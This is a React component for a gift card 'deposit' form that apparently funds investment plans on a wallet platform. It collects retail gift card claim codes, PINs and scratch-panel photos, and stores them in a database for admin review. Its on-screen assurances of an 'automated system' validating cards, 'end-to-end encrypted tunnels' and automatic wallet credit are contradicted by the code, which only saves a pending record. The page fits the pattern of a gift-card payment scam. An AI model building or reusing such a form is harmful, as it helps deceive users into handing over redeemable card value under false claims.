import React, { useState, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Gift, CreditCard, Upload, CheckCircle2, ShieldCheck, 
  Clock, AlertCircle, X, Image as ImageIcon, Send, 
  HelpCircle, Sparkles, ChevronRight, Lock
} from 'lucide-react';
import { toast } from 'sonner';
import { db, collection, addDoc, serverTimestamp } from '../firebase';
import { useAuth } from '../context/AuthContext';
import { fluidSpring } from './SystemManager';
import { GIFT_CARD_BRANDS, GiftCardBrand } from '../data/giftCards';
import { compressImage } from '../utils/imageCompressor';

interface GiftCardDepositProps {
  initialAmount?: number;
  planId?: string;
  planName?: string;
  planType?: string;
  onSuccess?: () => void;
  isModal?: boolean;
}

export default function GiftCardDepositSection({
  initialAmount,
  planId,
  planName,
  planType,
  onSuccess,
  isModal = false
}: GiftCardDepositProps) {
  const { user } = useAuth();
  
  const [selectedBrand, setSelectedBrand] = useState<GiftCardBrand>(GIFT_CARD_BRANDS[0]);
  const [cardCode, setCardCode] = useState('');
  const [cardPin, setCardPin] = useState('');
  const [cardAmount, setCardAmount] = useState<string>(initialAmount ? initialAmount.toString() : '100');
  const [cardCurrency, setCardCurrency] = useState('USD');
  const [customBrandName, setCustomBrandName] = useState('');
  const [notes, setNotes] = useState('');
  
  const [uploadedImages, setUploadedImages] = useState<{ id: string; name: string; dataUrl: string }[]>([]);
  const [isProcessingImages, setIsProcessingImages] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmittedSuccess, setIsSubmittedSuccess] = useState(false);
  const [submittedTxId, setSubmittedTxId] = useState<string | null>(null);
  
  const [selectedCategory, setSelectedCategory] = useState<string>('all');
  const [searchQuery, setSearchQuery] = useState('');
  const fileInputRef = useRef<HTMLInputElement>(null);

  const filteredBrands = GIFT_CARD_BRANDS.filter((brand) => {
    const matchesCategory = selectedCategory === 'all' || brand.category === selectedCategory;
    const matchesSearch = brand.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
                          brand.description.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesCategory && matchesSearch;
  });

  const parsedAmount = parseFloat(cardAmount) || 0;
  // Valuation calculation (1:1 USD rate for supported cards, minimal network fee $0.00)
  const creditedAmount = parsedAmount;

  const handleImageUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;

    if (uploadedImages.length + files.length > 4) {
      toast.error('Maximum 4 images allowed (Front, Back, Receipt, etc.)');
      return;
    }

    setIsProcessingImages(true);
    try {
      const newImages: { id: string; name: string; dataUrl: string }[] = [];
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        if (!file.type.startsWith('image/')) {
          toast.error(`${file.name} is not a valid image file.`);
          continue;
        }
        
        // Max 10MB raw file size guard
        if (file.size > 10 * 1024 * 1024) {
          toast.error(`${file.name} is larger than 10MB. Please select a smaller photo.`);
          continue;
        }

        const compressed = await compressImage(file, 1200, 1200, 0.75);
        newImages.push({
          id: Math.random().toString(36).substring(2, 9),
          name: file.name,
          dataUrl: compressed
        });
      }

      setUploadedImages(prev => [...prev, ...newImages]);
      toast.success('Gift card photo attached!');
    } catch (err: any) {
      console.error('Image compression error:', err);
      toast.error('Failed to process card photo.');
    } finally {
      setIsProcessingImages(false);
      if (fileInputRef.current) fileInputRef.current.value = '';
    }
  };

  const handleRemoveImage = (id: string) => {
    setUploadedImages(prev => prev.filter(img => img.id !== id));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user) {
      toast.error('Please log in to submit a gift card deposit.');
      return;
    }

    if (parsedAmount <= 0) {
      toast.error('Please enter a valid card face value.');
      return;
    }

    if (!cardCode.trim()) {
      toast.error('Please enter the gift card claim code or number.');
      return;
    }

    if (selectedBrand.pinRequired && !cardPin.trim()) {
      toast.error(`Please provide the ${selectedBrand.pinLabel || 'PIN / Security Code'}.`);
      return;
    }

    const effectiveBrandName = selectedBrand.id === 'other' && customBrandName.trim()
      ? customBrandName.trim()
      : selectedBrand.name;

    setIsSubmitting(true);
    try {
      const isDirectPlanPurchase = Boolean(planId && planName);
      const desc = isDirectPlanPurchase
        ? `Gift Card Payment for ${planName}: ${effectiveBrandName} (${cardCurrency} ${parsedAmount})`
        : `Gift Card Deposit: ${effectiveBrandName} (${cardCurrency} ${parsedAmount})`;

      // Create transaction document
      const txDocRef = await addDoc(collection(db, 'transactions'), {
        user_id: user.uid,
        type: 'deposit',
        payment_method: 'gift_card',
        method: `Gift Card (${effectiveBrandName})`,
        amount: creditedAmount,
        currency: cardCurrency,
        status: 'pending',
        description: desc,
        gift_card_brand: effectiveBrandName,
        gift_card_code: cardCode.trim(),
        gift_card_pin: cardPin.trim() || '',
        gift_card_currency: cardCurrency,
        gift_card_amount: parsedAmount,
        gift_card_images: uploadedImages.map(img => img.dataUrl),
        notes: notes.trim() || '',
        plan_id: planId || '',
        plan_name: planName || '',
        plan_type: planType || '',
        timestamp: serverTimestamp()
      });

      // Notify Admin in Firestore
      await addDoc(collection(db, 'notifications'), {
        type: 'gift_card_deposit',
        userId: user.uid,
        userName: user.email || 'Client',
        message: `🎁 New Gift Card ${isDirectPlanPurchase ? 'Payment' : 'Deposit'} of ${cardCurrency} ${parsedAmount} (${effectiveBrandName}) submitted by ${user.email}`,
        amount: creditedAmount,
        currency: cardCurrency,
        gift_card_brand: effectiveBrandName,
        timestamp: serverTimestamp(),
        read: false
      });

      setSubmittedTxId(txDocRef.id);
      setIsSubmittedSuccess(true);
      toast.success('Gift card submitted successfully! Our automated system is validating your card.');

      if (onSuccess) {
        setTimeout(() => onSuccess(), 2500);
      }
    } catch (error: any) {
      console.error('Gift card deposit submission error:', error);
      toast.error(error.message || 'Failed to submit gift card. Please contact live support.');
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isSubmittedSuccess) {
    return (
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={fluidSpring}
        className="p-8 text-center bg-surface border border-border/60 rounded-3xl"
      >
        <div className="w-16 h-16 mx-auto mb-4 bg-emerald-500/10 text-emerald-400 rounded-full flex items-center justify-center">
          <CheckCircle2 size={36} />
        </div>
        <h3 className="text-2xl font-bold text-primary mb-2">Gift Card Submitted!</h3>
        <p className="text-secondary text-sm max-w-md mx-auto mb-6">
          Your <strong className="text-primary">{selectedBrand.name}</strong> card of <strong className="text-emerald-400">{cardCurrency} {parsedAmount}</strong> has been queued for verification.
        </p>

        <div className="p-4 bg-background border border-border/50 rounded-2xl max-w-md mx-auto text-left mb-6 space-y-2 text-xs font-mono">
          <div className="flex justify-between">
            <span className="text-muted">Transaction ID:</span>
            <span className="text-primary font-bold">{submittedTxId?.substring(0, 12)}...</span>
          </div>
          <div className="flex justify-between">
            <span className="text-muted">Estimated Credit:</span>
            <span className="text-emerald-400 font-bold">${creditedAmount.toFixed(2)} USD</span>
          </div>
          <div className="flex justify-between">
            <span className="text-muted">Verification Status:</span>
            <span className="text-yellow-400 font-bold uppercase">Pending Audit (2-10 mins)</span>
          </div>
        </div>

        <div className="flex items-center justify-center gap-2 text-xs text-muted mb-6">
          <Clock size={14} className="text-[#0052ff]" />
          <span>Card credits will appear in your wallet balance automatically.</span>
        </div>

        <button
          onClick={() => {
            setIsSubmittedSuccess(false);
            setCardCode('');
            setCardPin('');
            setUploadedImages([]);
          }}
          className="px-6 py-2.5 rounded-full bg-surface border border-border text-primary hover:bg-subtle text-xs font-bold transition-all"
        >
          Submit Another Gift Card
        </button>
      </motion.div>
    );
  }

  return (
    <div className={`space-y-6 ${isModal ? '' : ''}`}>
      {/* Header Banner */}
      <div className="p-5 rounded-2xl bg-gradient-to-r from-amber-500/10 via-purple-500/10 to-blue-500/10 border border-amber-500/20 flex items-start gap-4">
        <div className="p-3 bg-amber-500/20 text-amber-400 rounded-xl flex-shrink-0">
          <Gift size={24} />
        </div>
        <div className="flex-1">
          <div className="flex items-center gap-2 mb-1">
            <h3 className="font-bold text-base text-primary">Pay & Deposit with Gift Cards</h3>
            <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-500/20 text-amber-300 uppercase tracking-wide">
              Instant 1:1 Value
            </span>
          </div>
          <p className="text-xs text-secondary leading-relaxed">
            We accept Apple, Steam, Amazon, Razer Gold, Vanilla Visa/Mastercard, Google Play, Xbox, PlayStation, Sephora, and other major retailer gift cards.
          </p>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Step 1: Select Brand */}
        <div>
          <div className="flex items-center justify-between mb-3">
            <label className="text-sm font-bold text-primary flex items-center gap-2">
              <span className="w-5 h-5 rounded-full bg-[#0052ff] text-white text-[11px] flex items-center justify-center font-mono">1</span>
              Select Gift Card Brand
            </label>
            <div className="flex gap-1 overflow-x-auto text-[11px]">
              {['all', 'digital', 'gaming', 'retail', 'prepaid'].map(cat => (
                <button
                  type="button"
                  key={cat}
                  onClick={() => setSelectedCategory(cat)}
                  className={`px-2.5 py-1 rounded-full capitalize transition-all ${
                    selectedCategory === cat
                      ? 'bg-[#0052ff] text-white font-bold'
                      : 'bg-surface border border-border/50 text-muted hover:text-primary'
                  }`}
                >
                  {cat}
                </button>
              ))}
            </div>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2.5 max-h-56 overflow-y-auto pr-1 custom-scrollbar">
            {filteredBrands.map((brand) => {
              const isSelected = selectedBrand.id === brand.id;
              return (
                <motion.div
                  key={brand.id}
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={() => setSelectedBrand(brand)}
                  className={`p-3 rounded-2xl border cursor-pointer transition-all flex flex-col justify-between ${
                    isSelected
                      ? 'bg-[#0052ff]/10 border-[#0052ff] shadow-lg shadow-[#0052ff]/10 ring-1 ring-[#0052ff]'
                      : 'bg-surface border-border/50 hover:border-border/80'
                  }`}
                >
                  <div className="flex items-center justify-between mb-2">
                    <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${brand.badgeBg}`}>
                      {brand.badgeText}
                    </span>
                    {isSelected && <CheckCircle2 size={14} className="text-[#0052ff]" />}
                  </div>
                  <p className="text-xs font-bold text-primary truncate">{brand.name}</p>
                  <p className="text-[10px] text-muted truncate mt-0.5">{brand.description}</p>
                </motion.div>
              );
            })}
          </div>

          {selectedBrand.id === 'other' && (
            <div className="mt-3">
              <label className="block text-xs font-medium text-secondary mb-1">Specify Gift Card Name / Store</label>
              <input
                type="text"
                value={customBrandName}
                onChange={(e) => setCustomBrandName(e.target.value)}
                placeholder="e.g. Best Buy, Target, Nordstrom, Uber, etc."
                className="w-full bg-background border border-border rounded-xl px-4 py-2.5 text-sm text-primary focus:outline-none focus:ring-2 focus:ring-[#0052ff]"
                required
              />
            </div>
          )}
        </div>

        {/* Step 2: Currency & Face Value */}
        <div className="p-4 bg-surface rounded-2xl border border-border/50 space-y-4">
          <label className="text-sm font-bold text-primary flex items-center gap-2">
            <span className="w-5 h-5 rounded-full bg-[#0052ff] text-white text-[11px] flex items-center justify-center font-mono">2</span>
            Card Face Value & Currency
          </label>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div>
              <label className="block text-xs font-medium text-secondary mb-1">Currency</label>
              <select
                value={cardCurrency}
                onChange={(e) => setCardCurrency(e.target.value)}
                className="w-full bg-background border border-border rounded-xl px-3 py-2.5 text-sm text-primary focus:outline-none focus:ring-2 focus:ring-[#0052ff]"
              >
                {selectedBrand.supportedCurrencies.map((cur) => (
                  <option key={cur} value={cur}>{cur} ({cur === 'USD' ? '$' : cur === 'EUR' ? '€' : cur === 'GBP' ? '£' : '$'})</option>
                ))}
              </select>
            </div>

            <div className="sm:col-span-2">
              <label className="block text-xs font-medium text-secondary mb-1">Face Value Amount</label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted text-sm font-bold">
                  {cardCurrency === 'EUR' ? '€' : cardCurrency === 'GBP' ? '£' : '$'}
                </span>
                <input
                  type="number"
                  step="any"
                  min="10"
                  value={cardAmount}
                  onChange={(e) => setCardAmount(e.target.value)}
                  placeholder="100.00"
                  className="w-full bg-background border border-border rounded-xl pl-8 pr-4 py-2.5 text-sm font-bold text-primary focus:outline-none focus:ring-2 focus:ring-[#0052ff]"
                  required
                />
              </div>
            </div>
          </div>

          {/* Quick preset buttons */}
          <div className="flex flex-wrap gap-2 pt-1">
            {selectedBrand.popularAmounts.map((amt) => (
              <button
                type="button"
                key={amt}
                onClick={() => setCardAmount(amt.toString())}
                className={`px-3 py-1 rounded-full text-xs font-bold transition-all ${
                  cardAmount === amt.toString()
                    ? 'bg-[#0052ff] text-white shadow-md'
                    : 'bg-background border border-border text-secondary hover:text-primary hover:border-border/80'
                }`}
              >
                {cardCurrency === 'EUR' ? '€' : cardCurrency === 'GBP' ? '£' : '$'}{amt}
              </button>
            ))}
          </div>

          {/* Real-Time Conversion Summary */}
          <div className="p-3 bg-background/80 rounded-xl border border-border/40 flex items-center justify-between text-xs">
            <span className="text-secondary flex items-center gap-1.5">
              <Sparkles size={14} className="text-amber-400" />
              Credited to Wallet Balance:
            </span>
            <span className="text-emerald-400 font-bold text-sm">
              ${creditedAmount.toFixed(2)} USD
            </span>
          </div>
        </div>

        {/* Step 3: Card Code & PIN */}
        <div className="p-4 bg-surface rounded-2xl border border-border/50 space-y-4">
          <label className="text-sm font-bold text-primary flex items-center gap-2">
            <span className="w-5 h-5 rounded-full bg-[#0052ff] text-white text-[11px] flex items-center justify-center font-mono">3</span>
            Card Details & Code
          </label>

          <div className="space-y-3">
            <div>
              <div className="flex justify-between items-center mb-1">
                <label className="text-xs font-medium text-secondary">
                  Claim Code / Card Number <span className="text-red-400">*</span>
                </label>
                <span className="text-[10px] text-muted">Format: {selectedBrand.placeholderCode}</span>
              </div>
              <input
                type="text"
                value={cardCode}
                onChange={(e) => setCardCode(e.target.value.toUpperCase())}
                placeholder={selectedBrand.placeholderCode}
                className="w-full bg-background border border-border rounded-xl px-4 py-2.5 text-sm font-mono tracking-wider text-primary uppercase focus:outline-none focus:ring-2 focus:ring-[#0052ff]"
                required
              />
            </div>

            <div>
              <div className="flex justify-between items-center mb-1">
                <label className="text-xs font-medium text-secondary">
                  {selectedBrand.pinLabel || 'Card PIN / Security Code'} 
                  {selectedBrand.pinRequired ? <span className="text-red-400 ml-1">*</span> : <span className="text-muted ml-1">(if applicable)</span>}
                </label>
              </div>
              <input
                type="text"
                value={cardPin}
                onChange={(e) => setCardPin(e.target.value)}
                placeholder={selectedBrand.pinPlaceholder || 'Scratch-off PIN or access code'}
                className="w-full bg-background border border-border rounded-xl px-4 py-2.5 text-sm font-mono text-primary focus:outline-none focus:ring-2 focus:ring-[#0052ff]"
                required={selectedBrand.pinRequired}
              />
            </div>
          </div>
        </div>

        {/* Step 4: Photo / Receipt Upload (Optional but Recommended) */}
        <div className="p-4 bg-surface rounded-2xl border border-border/50 space-y-3">
          <div className="flex items-center justify-between">
            <label className="text-sm font-bold text-primary flex items-center gap-2">
              <span className="w-5 h-5 rounded-full bg-[#0052ff] text-white text-[11px] flex items-center justify-center font-mono">4</span>
              Upload Card Photos / Receipt
            </label>
            <span className="text-[10px] text-emerald-400 font-bold bg-emerald-500/10 px-2 py-0.5 rounded-full">
              Accelerates Approval
            </span>
          </div>
          
          <p className="text-xs text-secondary">
            Attach clear photos of the physical card (front & back showing scratch panel) or digital purchase receipt screenshot.
          </p>

          <input
            type="file"
            ref={fileInputRef}
            onChange={handleImageUpload}
            multiple
            accept="image/*"
            className="hidden"
          />

          <div
            onClick={() => fileInputRef.current?.click()}
            className="border-2 border-dashed border-border/70 hover:border-[#0052ff] rounded-2xl p-6 text-center cursor-pointer transition-colors bg-background/50 hover:bg-background flex flex-col items-center justify-center gap-2"
          >
            <div className="w-10 h-10 rounded-full bg-[#0052ff]/10 text-[#0052ff] flex items-center justify-center">
              <Upload size={20} />
            </div>
            <p className="text-xs font-bold text-primary">Click or drag card photos here to upload</p>
            <p className="text-[10px] text-muted">Supports JPG, PNG, WEBP up to 10MB each</p>
          </div>

          {/* Uploaded Preview Chips */}
          {uploadedImages.length > 0 && (
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-2">
              {uploadedImages.map((img) => (
                <div key={img.id} className="relative group rounded-xl overflow-hidden border border-border/70 bg-black aspect-video flex items-center justify-center">
                  <img src={img.dataUrl} alt="Gift card preview" className="w-full h-full object-cover" />
                  <button
                    type="button"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleRemoveImage(img.id);
                    }}
                    className="absolute top-1 right-1 p-1 bg-red-600/90 text-white rounded-full opacity-90 hover:opacity-100 transition-opacity"
                  >
                    <X size={12} />
                  </button>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Optional Comments */}
        <div>
          <label className="block text-xs font-medium text-secondary mb-1">Additional Notes (Optional)</label>
          <input
            type="text"
            value={notes}
            onChange={(e) => setNotes(e.target.value)}
            placeholder="e.g. Purchased from Walmart, digital receipt attached"
            className="w-full bg-background border border-border rounded-xl px-4 py-2 text-xs text-primary focus:outline-none focus:ring-2 focus:ring-[#0052ff]"
          />
        </div>

        {/* Security & Audit Notice */}
        <div className="flex items-start gap-3 p-3.5 bg-background rounded-2xl border border-border/50 text-xs text-muted">
          <Lock size={16} className="text-[#0052ff] flex-shrink-0 mt-0.5" />
          <p className="leading-relaxed">
            All gift cards are processed via end-to-end encrypted tunnels. Fraudulent, duplicate, or redeemed codes will be immediately flagged and blocked.
          </p>
        </div>

        {/* Submit Button */}
        <motion.button
          whileHover={{ scale: 1.01 }}
          whileTap={{ scale: 0.99 }}
          transition={fluidSpring}
          type="submit"
          disabled={isSubmitting || isProcessingImages}
          className="w-full py-4 rounded-2xl bg-[#0052ff] hover:bg-[#0052ff]/90 text-white font-bold flex items-center justify-center gap-2 shadow-xl shadow-[#0052ff]/25 transition-all disabled:opacity-50"
        >
          {isSubmitting ? (
            <div className="flex items-center gap-2">
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
              <span>Verifying and Submitting Card...</span>
            </div>
          ) : (
            <>
              <Send size={18} />
              <span>
                {planName ? `Pay for ${planName} with Gift Card ($${creditedAmount.toFixed(2)})` : `Submit Gift Card for Deposit ($${creditedAmount.toFixed(2)})`}
              </span>
            </>
          )}
        </motion.button>
      </form>
    </div>
  );
}
